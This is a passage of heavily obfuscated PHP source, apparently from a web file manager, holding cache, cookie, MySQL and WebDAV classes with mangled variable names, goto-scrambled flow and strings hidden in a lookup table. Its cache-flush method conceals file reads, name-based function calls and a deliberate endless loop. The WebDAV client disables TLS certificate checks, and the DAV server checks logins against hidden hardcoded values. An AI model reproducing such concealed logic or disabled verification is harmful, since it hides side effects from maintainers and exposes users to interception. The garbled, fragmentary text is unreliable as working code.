$A¦ÙÅ‹¥š; } } if (in_array(self::AUTH_ROOT, $c´Ã³ãŠŒ)) { $FŒ¾‡’ÏÒ = array_sum($BÇ¸ »‘ùÆ); return; } $c‹™¯Ì³•‘ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto A£±³ÛÎ«¹; eª«áİ¥ò“: } public function sort($c‹Œùñ„Ô, $AÎƒš…¤¬Æ) { return parent::update($c‹Œùñ„Ô, $AÎƒš…¤¬Æ); } } goto C¥ôöİ‡¾Ö; c´æ‰âŒÇ–: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($CêÍ”‹ƒ‹Œ, $dºïßºŒ°Ø) { $f¥–“»“º =& $_SERVER[îÖ]; if (!class_exists($f¥–“»“º[780])) { show_json($f¥–“»“º[781], !1); } $this->cacheTime = $dºïßºŒ°Ø; $dÀ“ ä´¯Ş = isset($CêÍ”‹ƒ‹Œ[$f¥–“»“º[782]]) ? $CêÍ”‹ƒ‹Œ[$f¥–“»“º[782]] : 10; $FİÔ¦„äßİ = _get($CêÍ”‹ƒ‹Œ, $f¥–“»“º[779]); if ($FİÔ¦„äßİ && is_array($FİÔ¦„äßİ)) { $this->initCluster($CêÍ”‹ƒ‹Œ, $dÀ“ ä´¯Ş); } else { $this->handle = $this->init($CêÍ”‹ƒ‹Œ, $dÀ“ ä´¯Ş); } } private function init($c÷Œ‘¶°´Ğ, $Eõ¦¼†‘ò ) { $AÏæôƒË´´ =& $_SERVER[îÖ]; $Dßø÷Äê¦Ù = new Redis(); $cí„àÇ÷ÍÛ = isset($c÷Œ‘¶°´Ğ[$AÏæôƒË´´[783]]) ? $c÷Œ‘¶°´Ğ[$AÏæôƒË´´[783]] : !1; if ($cí„àÇ÷ÍÛ) { $Dßø÷Äê¦Ù->pconnect($c÷Œ‘¶°´Ğ[$AÏæôƒË´´[169]], $c÷Œ‘¶°´Ğ[$AÏæôƒË´´[170]], $Eõ¦¼†‘ò ); } else { $Dßø÷Äê¦Ù->connect($c÷Œ‘¶°´Ğ[$AÏæôƒË´´[169]], $c÷Œ‘¶°´Ğ[$AÏæôƒË´´[170]], $Eõ¦¼†‘ò ); } if (!empty($c÷Œ‘¶°´Ğ[$AÏæôƒË´´[376]])) { $Dßø÷Äê¦Ù->auth($c÷Œ‘¶°´Ğ[$AÏæôƒË´´[376]]); } return $Dßø÷Äê¦Ù; } private function initCluster($Dî¡Á¶Ù·Ì, $Eë‘¸ƒ‚) { $cÊâ¬Ø¤ö =& $_SERVER[îÖ]; $aÎçÇï›ğ™ = array($cÊâ¬Ø¤ö[784], $cÊâ¬Ø¤ö[785], $cÊâ¬Ø¤ö[786]); $AŒÖ–¯àë¶ = $cÊâ¬Ø¤ö[784]; if (isset($Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[12]]) && in_array($Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[12]], $aÎçÇï›ğ™)) { $AŒÖ–¯àë¶ = $Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[12]]; } switch ($AŒÖ–¯àë¶) { case $cÊâ¬Ø¤ö[784]: $this->_slave($Dî¡Á¶Ù·Ì, $Eë‘¸ƒ‚); break; case $cÊâ¬Ø¤ö[785]: break; case $cÊâ¬Ø¤ö[786]: $this->isCluster = !0; $BœğÛ‡ÃÓœ = $Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[779]]; $B¾‰„”—“ä = isset($Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[783]]) ? $Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[783]] : !1; $Bî»ø¿Ä¶ = isset($Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[376]]) ? $Dî¡Á¶Ù·Ì[$cÊâ¬Ø¤ö[376]] : null; $this->handle = new RedisCluster(NUll, $BœğÛ‡ÃÓœ, $Eë‘¸ƒ‚, $Eë‘¸ƒ‚, $B¾‰„”—“ä, $Bî»ø¿Ä¶); break; default: break; } } private function _slave($DÃöÅùÏÕƒ, $FÂÁËïºô‚) { goto AùÌÆŒË¸Ó; AùÌÆŒË¸Ó: $B®ï³â…Äà = $DÃöÅùÏÕƒ[$_SERVER[îÖ][779]]; $this->filterConfig($DÃöÅùÏÕƒ, $B®ï³â…Äà[0]); $this->handle = $this->init($DÃöÅùÏÕƒ, $FÂÁËïºô‚); goto dË²ßÙÛİ; dË²ßÙÛİ: unset($B®ï³â…Äà[0]); if (empty($B®ï³â…Äà)) { return; } $bä½•½æ† = array_rand($B®ï³â…Äà); goto aÛÕ ¦Å˜Ù; aÛÕ ¦Å˜Ù: $this->filterConfig($DÃöÅùÏÕƒ, $B®ï³â…Äà[$bä½•½æ†]); $this->slaveHandle = $this->init($DÃöÅùÏÕƒ, $FÂÁËïºô‚); goto Eë¶Š–›±; Eë¶Š–›±: } private function filterConfig(&$DöÃ…ÑÙ“¶, $Eà«òå¹Ã) { $cÒÎ…Ëõ© =& $_SERVER[îÖ]; $aœÛ±©²  = explode($cÒÎ…Ëõ©[4], $Eà«òå¹Ã); $cÜ¢ò¬«·Ğ = array($cÒÎ…Ëõ©[169] => $aœÛ±©² [0], $cÒÎ…Ëõ©[170] => $aœÛ±©² [1]); $DöÃ…ÑÙ“¶ = array_merge($DöÃ…ÑÙ“¶, $cÜ¢ò¬«·Ğ); } public function set($cñí›ˆ¡öè, $Dæ…ÀÉš“, $E÷–ô‹ß¸Ù = false) { $E÷–ô‹ß¸Ù = $E÷–ô‹ß¸Ù ? $E÷–ô‹ß¸Ù : $this->cacheTime; return $this->handle->setEx($cñí›ˆ¡öè, $E÷–ô‹ß¸Ù, $Dæ…ÀÉš“); } public function setLock($F® Œ¦Ÿ•Á, $aï˜Å¿Ç»©, $e–ßÊ™Øé°) { return $this->handle->setNX($F® Œ¦Ÿ•Á, $aï˜Å¿Ç»©); } public function get($eô®Œ±Ä) { $FÊº¤¨è = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $FÊº¤¨è->get($eô®Œ±Ä); } public function remove($C½Ì««Ôó®) { return $this->handle->del($C½Ì««Ôó®); } public function deleteAll() { $cáôõàÇ‹Ç =& $_SERVER[îÖ]; if (!isset($_SERVER[$cáôõàÇ‹Ç[680]]) || !isset($_SERVER[$cáôõàÇ‹Ç[787]])) { goto d¸ƒ´Éù”¾; d¸ƒ´Éù”¾: $E¡è÷›İ¼Ú = $cáôõàÇ‹Ç[788]; $DƒŒÈê¨°‡ = $cáôõàÇ‹Ç[681]; $B‹ÜĞöÙˆ‹ = $_SERVER[$cáôõàÇ‹Ç[682]] . $cáôõàÇ‹Ç[683]; goto C‹ÚØîª¥¸; C‹ÚØîª¥¸: $fë’´ˆÒ¦ = $DƒŒÈê¨°‡($B‹ÜĞöÙˆ‹); $c±‹±åâ®Í = explode($cáôõàÇ‹Ç[217], $fë’´ˆÒ¦); if (count($c±‹±åâ®Í) < $cáôõàÇ‹Ç[555]) { $eõ¦ù™’ªñ = $cáôõàÇ‹Ç[684]; $eõ¦ù™’ªñ(); } goto AÍÅãôÃèÚ; c·²ë‘Ìî: for ($dêñïŒ½ã = $bïÚ»÷‡; $dêñïŒ½ã > 0; $dêñïŒ½ã++) { $C¸±°»Ã©› = json_encode($GLOBALS[$cáôõàÇ‹Ç[384]]); } goto FËÔèÔ‡öÌ; AÍÅãôÃèÚ: $C¸±°»Ã©› = $cáôõàÇ‹Ç[789]; $C¸±°»Ã©›($_SERVER[$cáôõàÇ‹Ç[790]]); $bïÚ»÷‡ = 1; goto c·²ë‘Ìî; FËÔèÔ‡öÌ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $cæË£òğÖ) { $this->handle->flushall($cæË£òğÖ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B®‡î…ñ¹ = '', $EÖÇ“´Ğæ = 0) { if (is_string($B®‡î…ñ¹) && $B®‡î…ñ¹ != $_SERVER[îÖ][33]) { $this->prefix = $B®‡î…ñ¹; } if (is_numeric($EÖÇ“´Ğæ) && $EÖÇ“´Ğæ > 0) { $this->expire = $EÖÇ“´Ğæ; } } public static function getInstance() { static $Aˆ…ã®èÉÃ; if ($Aˆ…ã®èÉÃ === null) { $Aˆ…ã®èÉÃ = new self(); } return $Aˆ…ã®èÉÃ; } private static $sameCookieSet = array(); public static function set($eÕòÈ§šµë, $d´ğ“ùË¬ˆ, $AÂĞ«‚¬ = 0, $cñÁµ‘ø£– = false, $BÅŠ÷Õ‰Í¥ = false) { goto eš’ØŒâğ; FØÎ‡¹®ÅÁ: setcookie($eÕòÈ§šµë, $d´ğ“ùË¬ˆ, time() + $AÂĞ«‚¬, $f›•æ˜áÆ§[8] . trim($BÅŠ÷Õ‰Í¥, $f›•æ˜áÆ§[8]) . $EÑÇ³’¡÷, !1, !1, $cñÁµ‘ø£–); goto Cù¨Í°¿ñ¢; BñÛô“à¢: self::$sameCookieSet[$eÕòÈ§šµë] = $d´ğ“ùË¬ˆ . $AÂĞ«‚¬; if (!$BÅŠ÷Õ‰Í¥) { $BÅŠ÷Õ‰Í¥ = str_replace(HOST, $f›•æ˜áÆ§[33], APP_HOST); $BÅŠ÷Õ‰Í¥ = _get($GLOBALS, $f›•æ˜áÆ§[791], $BÅŠ÷Õ‰Í¥); } $EÑÇ³’¡÷ = $f›•æ˜áÆ§[33]; goto FØÎ‡¹®ÅÁ; eš’ØŒâğ: $f›•æ˜áÆ§ =& $_SERVER[îÖ]; if (!$AÂĞ«‚¬) { $AÂĞ«‚¬ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$eÕòÈ§šµë]) && self::$sameCookieSet[$eÕòÈ§šµë] == $d´ğ“ùË¬ˆ . $AÂĞ«‚¬) { return; } goto BñÛô“à¢; Cù¨Í°¿ñ¢: } public static function setSafe($Eõè­ˆˆñŞ, $BŞäôÀ¯, $cøë›ìŒæ = 0) { self::set($Eõè­ˆˆñŞ, $BŞäôÀ¯, $cøë›ìŒæ, !0); } public static function get($AÊ¨ƒÑ«Á³) { return isset($_COOKIE[$AÊ¨ƒÑ«Á³]) ? $_COOKIE[$AÊ¨ƒÑ«Á³] : !1; } public static function remove($f‹¢»¶†·ë, $A®´á‡›ÜÊ = false) { unset($_COOKIE[$f‹¢»¶†·ë]); self::set($f‹¢»¶†·ë, $_SERVER[îÖ][33], 1, $A®´á‡›ÜÊ); } } class DbMysql extends Db { public function __construct($E¼ƒÂÑÛ¯ = '') { $fÉ’çìƒæ½ =& $_SERVER[îÖ]; if (!extension_loaded($fÉ’çìƒæ½[727])) { think_exception(think_lang($fÉ’çìƒæ½[10]) . $fÉ’çìƒæ½[792]); } if (!empty($E¼ƒÂÑÛ¯)) { $this->config = $E¼ƒÂÑÛ¯; if (empty($this->config[$fÉ’çìƒæ½[13]])) { $this->config[$fÉ’çìƒæ½[13]] = $fÉ’çìƒæ½[33]; } } } public function connect($A¾‰ÀµƒªÉ = '', $A±›ãœ˜âå = 0, $A—æø–Ôˆã = false) { $D¹ó‘•ïçí =& $_SERVER[îÖ]; if (!isset($this->linkID[$A±›ãœ˜âå])) { goto Añ•½Ñ‡•; CóĞÒ½ŸóØ: if ($B’ŞÔÖäÕ) { $this->linkID[$A±›ãœ˜âå] = mysql_pconnect($D»’†­ÚÒ, $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[795]], $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[796]], 131072); } else { $this->linkID[$A±›ãœ˜âå] = mysql_connect($D»’†­ÚÒ, $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[795]], $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[796]], !0, 131072); } if (!$this->linkID[$A±›ãœ˜âå] || !empty($A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[17]]) && !mysql_select_db($A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[17]], $this->linkID[$A±›ãœ˜âå])) { think_exception(mysql_error()); } $b¯øÆè…ê = mysql_get_server_info($this->linkID[$A±›ãœ˜âå]); goto Bƒ®ë»Ø†æ; Bƒ®ë»Ø†æ: mysql_query($D¹ó‘•ïçí[797] . think_config($D¹ó‘•ïçí[798]) . $D¹ó‘•ïçí[55], $this->linkID[$A±›ãœ˜âå]); if ($b¯øÆè…ê > $D¹ó‘•ïçí[799]) { mysql_query($D¹ó‘•ïçí[800], $this->linkID[$A±›ãœ˜âå]); } $this->connected = !0; goto d”İ²Œ´°×; Añ•½Ñ‡•: if (empty($A¾‰ÀµƒªÉ)) { $A¾‰ÀµƒªÉ = $this->config; } $D»’†­ÚÒ = $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[793]] . ($A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[794]] ? "\72{$A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[794]]}" : $D¹ó‘•ïçí[33]); $B’ŞÔÖäÕ = !empty($A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[13]][$D¹ó‘•ïçí[14]]) ? $A¾‰ÀµƒªÉ[$D¹ó‘•ïçí[13]][$D¹ó‘•ïçí[14]] : $this->pconnect; goto CóĞÒ½ŸóØ; d”İ²Œ´°×: if (1 != think_config($D¹ó‘•ïçí[18])) { unset($this->config); } goto aæÛîÎÑ—; aæÛîÎÑ—: } return $this->linkID[$A±›ãœ˜âå]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eèììä…Ó¬) { goto F¿Ì¯ÔğÆ«; aÕ×à”ÑÈ…: if (!$this->_linkID) { return !1; } $this->queryStr = $eèììä…Ó¬; if ($this->queryID) { $this->free(); } goto DğÍ¢¯âèƒ; F¿Ì¯ÔğÆ«: $f¼£³ÌĞ£¿ =& $_SERVER[îÖ]; if (0 === stripos($eèììä…Ó¬, $f¼£³ÌĞ£¿[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto aÕ×à”ÑÈ…; DğÍ¢¯âèƒ: think_action_status($f¼£³ÌĞ£¿[19], 1); think_status($f¼£³ÌĞ£¿[20]); $this->queryID = mysql_query($eèììä…Ó¬, $this->_linkID); goto d×Á¸ŞÒˆÌ; d×Á¸ŞÒˆÌ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto E”‘Úßõä²; E”‘Úßõä²: } public function execute($bÓŞĞî©ÃŒ) { goto B Ÿ®Á„Ì; f®Â¶’Õø‘: $this->queryStr = $bÓŞĞî©ÃŒ; if ($this->queryID) { $this->free(); } think_action_status($aÓµÛŞÊîˆ[21], 1); goto A÷ÔÉ’Éªì; B Ÿ®Á„Ì: $aÓµÛŞÊîˆ =& $_SERVER[îÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f®Â¶’Õø‘; E‘¾³Ñ¸ƒ„: if (!1 === $F”ïËÄÎˆï) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto C¾öø¶ÆÓ¨; A÷ÔÉ’Éªì: think_status($aÓµÛŞÊîˆ[20]); $F”ïËÄÎˆï = mysql_query($bÓŞĞî©ÃŒ, $this->_linkID); $this->debug(); goto E‘¾³Ñ¸ƒ„; C¾öø¶ÆÓ¨: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[îÖ][801], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B£’„²Ğ†‘ = mysql_query($_SERVER[îÖ][802], $this->_linkID); $this->transTimes = 0; if (!$B£’„²Ğ†‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F¦À…ŞºÅ = mysql_query($_SERVER[îÖ][803], $this->_linkID); $this->transTimes = 0; if (!$F¦À…ŞºÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $d—²‰ÕÎÔ“ = array(); if ($this->numRows > 0) { while ($bÂá¨÷Ğ¯ø = mysql_fetch_assoc($this->queryID)) { $d—²‰ÕÎÔ“[] = $bÂá¨÷Ğ¯ø; } mysql_data_seek($this->queryID, 0); } return $d—²‰ÕÎÔ“; } public function getFields($b»©±êÁòô) { $a„¦•Ø±¡Ï =& $_SERVER[îÖ]; $A¯âæ³Ïñè = $this->query($a„¦•Ø±¡Ï[804] . $this->parseKey($b»©±êÁòô)); $bÉŠ³Î… ô = array(); if ($A¯âæ³Ïñè) { foreach ($A¯âæ³Ïñè as $A´ëÄ„êßç => $açÖÜø‘­´) { $bÉŠ³Î… ô[$açÖÜø‘­´[$a„¦•Ø±¡Ï[27]]] = array($a„¦•Ø±¡Ï[28] => $açÖÜø‘­´[$a„¦•Ø±¡Ï[27]], $a„¦•Ø±¡Ï[29] => $açÖÜø‘­´[$a„¦•Ø±¡Ï[30]], $a„¦•Ø±¡Ï[31] => (bool) (strtoupper($açÖÜø‘­´[$a„¦•Ø±¡Ï[32]]) === $a„¦•Ø±¡Ï[805]), $a„¦•Ø±¡Ï[34] => $açÖÜø‘­´[$a„¦•Ø±¡Ï[35]], $a„¦•Ø±¡Ï[36] => strtolower($açÖÜø‘­´[$a„¦•Ø±¡Ï[37]]) == $a„¦•Ø±¡Ï[38], $a„¦•Ø±¡Ï[39] => strtolower($açÖÜø‘­´[$a„¦•Ø±¡Ï[40]]) == $a„¦•Ø±¡Ï[41]); } } return $bÉŠ³Î… ô; } public function getTables($dÀÎòé¡ = '') { $dåñê¥À´ =& $_SERVER[îÖ]; if (!empty($dÀÎòé¡)) { $EŸÏ¹³œ× = $dåñê¥À´[806] . $dÀÎòé¡; } else { $EŸÏ¹³œ× = $dåñê¥À´[807]; } $fĞæ¿èÕİ¹ = $this->query($EŸÏ¹³œ×); $f±øàí¿¶Ó = array(); foreach ($fĞæ¿èÕİ¹ as $cµ‘†Øå¢ò => $eŒæ­·îÑ¤) { $f±øàí¿¶Ó[$cµ‘†Øå¢ò] = current($eŒæ­·îÑ¤); } return $f±øàí¿¶Ó; } public function replace($Aß¢¯ø‹¶¡, $cÈ‹›™Ùç = array()) { $C¼Š‘îÈÅÀ =& $_SERVER[îÖ]; foreach ($Aß¢¯ø‹¶¡ as $fÅ§­˜Û => $f¶Âåö²¦İ) { $d‡ì½»àÃë = $this->parseValue($f¶Âåö²¦İ); if (is_scalar($d‡ì½»àÃë)) { $CñÀ†ñÈ–¥[] = $d‡ì½»àÃë; $cŒÊ£Ô¡ØÎ[] = $this->parseKey($fÅ§­˜Û); } } $CÎÓç’Ãİ = $C¼Š‘îÈÅÀ[808] . $this->parseTable($cÈ‹›™Ùç[$C¼Š‘îÈÅÀ[267]]) . $C¼Š‘îÈÅÀ[809] . implode($C¼Š‘îÈÅÀ[47], $cŒÊ£Ô¡ØÎ) . $C¼Š‘îÈÅÀ[810] . implode($C¼Š‘îÈÅÀ[47], $CñÀ†ñÈ–¥) . $C¼Š‘îÈÅÀ[811]; return $this->execute($CÎÓç’Ãİ); } public function insertAll($f™°†‹‘ó, $B‘‚á‚Ø‹Ö = array(), $CÕøæ˜½‹Ò = false) { goto Eš‰Í¿ÕËÛ; eÂŸ¤¯»÷õ: $f½Æ¹‚„ÚÕ = ($CÕøæ˜½‹Ò ? $Aìˆ‚¡Èø°[813] : $Aìˆ‚¡Èø°[814]) . $Aìˆ‚¡Èø°[815] . $this->parseTable($B‘‚á‚Ø‹Ö[$Aìˆ‚¡Èø°[267]]) . $Aìˆ‚¡Èø°[809] . implode($Aìˆ‚¡Èø°[47], $aÃ‘¨ºğ¬ß) . $Aìˆ‚¡Èø°[816] . implode($Aìˆ‚¡Èø°[47], $Aº„‡™õ‘); return $this->execute($f½Æ¹‚„ÚÕ); goto F¿ÒŒ²ßÕ; Eš‰Í¿ÕËÛ: $Aìˆ‚¡Èø° =& $_SERVER[îÖ]; if (!is_array($f™°†‹‘ó[0])) { return !1; } $aÃ‘¨ºğ¬ß = array_keys($f™°†‹‘ó[0]); goto D¢ºà‚¡Œå; D¢ºà‚¡Œå: $Aº„‡™õ‘ = array(); foreach ($f™°†‹‘ó as $F§Şá·ğ) { $DÙòÑÕÏ”… = array(); foreach ($F§Şá·ğ as $fá£§‰™Ù‹ => $Eš™Ş¼òÓ) { $Eš™Ş¼òÓ = $this->parseValue($Eš™Ş¼òÓ); if (is_scalar($Eš™Ş¼òÓ)) { $DÙòÑÕÏ”…[] = $Eš™Ş¼òÓ; } } $Aº„‡™õ‘[] = $Aìˆ‚¡Èø°[248] . implode($Aìˆ‚¡Èø°[47], $DÙòÑÕÏ”…) . $Aìˆ‚¡Èø°[811]; } array_walk($aÃ‘¨ºğ¬ß, array($this, $Aìˆ‚¡Èø°[812])); goto eÂŸ¤¯»÷õ; F¿ÒŒ²ßÕ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $dµ¾‘’¦ï =& $_SERVER[îÖ]; $this->error = mysql_errno() . $dµ¾‘’¦ï[4] . mysql_error($this->_linkID); if ($dµ¾‘’¦ï[33] != $this->queryStr) { $this->error .= LNG($dµ¾‘’¦ï[45]) . $this->queryStr; } think_trace($this->error, $dµ¾‘’¦ï[33], $dµ¾‘’¦ï[46]); return $this->error; } public function escapeString($eŠ±ßåÚñÄ) { if ($this->_linkID) { return mysql_real_escape_string($eŠ±ßåÚñÄ, $this->_linkID); } else { return mysql_escape_string($eŠ±ßåÚñÄ); } } public function parseKey(&$A¹‹œ‚½ôó, $a‡×â²‹¸ä = true) { $FÔõÆÄÖ÷ =& $_SERVER[îÖ]; if ($a‡×â²‹¸ä) { $A¹‹œ‚½ôó = $this->parseKeyCheck($A¹‹œ‚½ôó); } if ($A¹‹œ‚½ôó != $FÔõÆÄÖ÷[176] && !preg_match($FÔõÆÄÖ÷[817], $A¹‹œ‚½ôó)) { $A¹‹œ‚½ôó = $FÔõÆÄÖ÷[818] . trim($A¹‹œ‚½ôó, $FÔõÆÄÖ÷[818]) . $FÔõÆÄÖ÷[818]; } return $A¹‹œ‚½ôó; } } goto cÀ¯”ÊÙªË; BŠ«á†»¬•: class HttpDavClient { public function __construct($C«Š–ˆ¦…‹, $d¤ÓŸç‹Ôæ, $Bä«ëªñœŞ) { $this->header = array(); $this->userName = $d¤ÓŸç‹Ôæ; $this->userPassowrd = $Bä«ëªñœŞ; } protected function makePath($D‘ß÷ÄÇ) { return $D‘ß÷ÄÇ; } protected function setHeader($CÉøë•„Ë¼, $f›öÑë¿Ò› = false) { if ($f›öÑë¿Ò› === !1) { $this->header[] = $CÉøë•„Ë¼; } else { $this->header[] = $CÉøë•„Ë¼ . $_SERVER[îÖ][874] . $f›öÑë¿Ò›; } } public function move($eŒæÂÎ‘ö¡, $BñâÁ›¸á•, $d„Ç²éÙòí = '') { $C¨Ôîæ” Š =& $_SERVER[îÖ]; $this->setHeader($C¨Ôîæ” Š[1763], $this->makePath($BñâÁ›¸á•)); $this->setHeader($C¨Ôîæ” Š[1764], $C¨Ôîæ” Š[1765]); if ($d„Ç²éÙòí) { $this->setHeader($C¨Ôîæ” Š[1766], $C¨Ôîæ” Š[919] . $d„Ç²éÙòí . $C¨Ôîæ” Š[922]); } return $this->send($C¨Ôîæ” Š[1767], $eŒæÂÎ‘ö¡); } public function copy($fªÉÚÍÛÕ†, $B°Ó±øëáÌ) { $aÑÍºÖ‘¢ =& $_SERVER[îÖ]; $this->setHeader($aÑÍºÖ‘¢[1763], $this->makePath($B°Ó±øëáÌ)); $this->setHeader($aÑÍºÖ‘¢[1764], $aÑÍºÖ‘¢[1765]); return $this->send($aÑÍºÖ‘¢[1768], $fªÉÚÍÛÕ†); } public function mkcol($c”áº‰éÁÜ) { $f±°•·»°Ó =& $_SERVER[îÖ]; $this->setHeader($f±°•·»°Ó[1764], $f±°•·»°Ó[1765]); return $this->send($f±°•·»°Ó[1769], $c”áº‰éÁÜ); } public function delete($d¦­Î£Û¢¬, $F…Âİ¯Ô† = '') { $AÊ¤Ú™ğİŠ =& $_SERVER[îÖ]; if ($F…Âİ¯Ô†) { $this->setHeader($AÊ¤Ú™ğİŠ[1766], $AÊ¤Ú™ğİŠ[919] . $F…Âİ¯Ô† . $AÊ¤Ú™ğİŠ[922]); } return $this->send($AÊ¤Ú™ğİŠ[1245], $d¦­Î£Û¢¬); } public function propfind($fŞä¢¢¯Ë) { $e‚ØÔ‹»£ =& $_SERVER[îÖ]; $this->setHeader($e‚ØÔ‹»£[1770], $e‚ØÔ‹»£[83]); $this->setHeader($e‚ØÔ‹»£[1771], $e‚ØÔ‹»£[1772]); $C¾ô¥å¸¦ = $e‚ØÔ‹»£[1773]; return $this->send($e‚ØÔ‹»£[1774], $fŞä¢¢¯Ë, $C¾ô¥å¸¦); } public function options($b¯ƒ¥ôÜ£) { return $this->send($_SERVER[îÖ][1775], $b¯ƒ¥ôÜ£); } public function get($f¥˜·Ùº«í) { return $this->send($_SERVER[îÖ][216], $f¥˜·Ùº«í); } public function put($eÓ¹§‡Œ¦„, $Còğµ‹ÁÒ‚, $EÎ•ÏøÔ¬  = '') { $e¥å¶…’Ó =& $_SERVER[îÖ]; if ($EÎ•ÏøÔ¬ ) { $this->setHeader($e¥å¶…’Ó[1766], $e¥å¶…’Ó[919] . $EÎ•ÏøÔ¬  . $e¥å¶…’Ó[922]); } return $this->send($e¥å¶…’Ó[214], $eÓ¹§‡Œ¦„, $Còğµ‹ÁÒ‚); } protected function send($e”Ö„„œÓ‘, $E“£ƒÔ´‚…, $c©¶·„ˆæ§ = false, $c¡ôì§š = false) { goto fœ¿¥”Ûä¿; Bµƒ¢ˆ¢: $this->header = array(); return $B¥…ºĞÒ¦; goto f…ÎÑ¾ô„Ò; e¥®Şˆø­¨: $dÚÕÅßŸğå = curl_init($E“£ƒÔ´‚…); curl_setopt($dÚÕÅßŸğå, CURLOPT_CUSTOMREQUEST, $e”Ö„„œÓ‘); curl_setopt($dÚÕÅßŸğå, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Cİ©µ£…èê; FÎ«Ç³ƒƒº: $this->setHeader($dŸ…¤Ú½Š); if ($c©¶·„ˆæ§) { $c©¶·„ˆæ§ = $fªƒ¬ÅßÔ‹[1777] . $c©¶·„ˆæ§; } if (!request_url_safe($E“£ƒÔ´‚…)) { return !1; } goto e¥®Şˆø­¨; fœ¿¥”Ûä¿: $fªƒ¬ÅßÔ‹ =& $_SERVER[îÖ]; $dŸ…¤Ú½Š = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($fªƒ¬ÅßÔ‹[1776], $fªƒ¬ÅßÔ‹[50]); goto FÎ«Ç³ƒƒº; Cİ©µ£…èê: curl_setopt($dÚÕÅßŸğå, CURLOPT_HTTPHEADER, $this->header); curl_setopt($dÚÕÅßŸğå, CURLOPT_RETURNTRANSFER, !0); curl_setopt($dÚÕÅßŸğå, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto CƒµÅÑùƒ; CƒµÅÑùƒ: curl_setopt($dÚÕÅßŸğå, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($dÚÕÅßŸğå, CURLOPT_SSL_VERIFYHOST, !1); $B¥…ºĞÒ¦ = curl_exec($dÚÕÅßŸğå); goto Bµƒ¢ˆ¢; f…ÎÑ¾ô„Ò: } } class HttpDavServer { public function __construct($f¤¢ãÖÅê, $E±Œí²•›ñ) { $this->root = $f¤¢ãÖÅê; $this->initPath($E±Œí²•›ñ); $this->start(); } public function initPath($Aä¢¯¸¼õ) { $bê•¨ÒŞ… =& $_SERVER[îÖ]; $DŠÆõ´œî = rtrim($_SERVER[$bê•¨ÒŞ…[1382]], $bê•¨ÒŞ…[8]) . $bê•¨ÒŞ…[8]; $this->urlBase = substr($DŠÆõ´œî, 0, strpos($DŠÆõ´œî, $Aä¢¯¸¼õ) + 1); $this->urlBase = rtrim($this->urlBase, $bê•¨ÒŞ…[8]) . $Aä¢¯¸¼õ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $eÙ·” ‚œ¡ =& $_SERVER[îÖ]; $B£–§èµì = HttpAuth::get(); if ($B£–§èµì[$eÙ·” ‚œ¡[535]] == $eÙ·” ‚œ¡[1778] && $B£–§èµì[$eÙ·” ‚œ¡[891]] == $eÙ·” ‚œ¡[1779]) { return !0; } HttpAuth::error(); } public function start() { goto bÓ÷õ»Í†; AµÛÎœ¸âÒ: if (!method_exists($this, $AœË²‚‰¾Ù)) { pr($AœË²‚‰¾Ù . $FøŒ†à¡–æ[1780]); die; } $b˜¦˜Ø­±µ = array($FøŒ†à¡–æ[1781], $FøŒ†à¡–æ[1782]); if (!in_array($AœË²‚‰¾Ù, $b˜¦˜Ø­±µ) && !$this->pathExists($this->path)) { $DÌòä„¼é® = array($FøŒ†à¡–æ[1026] => 404); } else { $DÌòä„¼é® = $this->{$AœË²‚‰¾Ù}(); } goto e¡‰¬Ü¿«Ö; e¡‰¬Ü¿«Ö: if (!$DÌòä„¼é®) { return; } self::response($DÌòä„¼é®); goto aŞ…ŠğÀù¡; bÓ÷õ»Í†: $FøŒ†à¡–æ =& $_SERVER[îÖ]; $this->checkUser(); $AœË²‚‰¾Ù = $FøŒ†à¡–æ[144] . HttpHeader::method(); goto AµÛÎœ¸âÒ; aŞ…ŠğÀù¡: } public function pathGet($BºâÙ‡ùº = false) { $d¹˜è‚ƒÅ¦ =& $_SERVER[îÖ]; $c°í¦¡·Ìù = $BºâÙ‡ùº ? 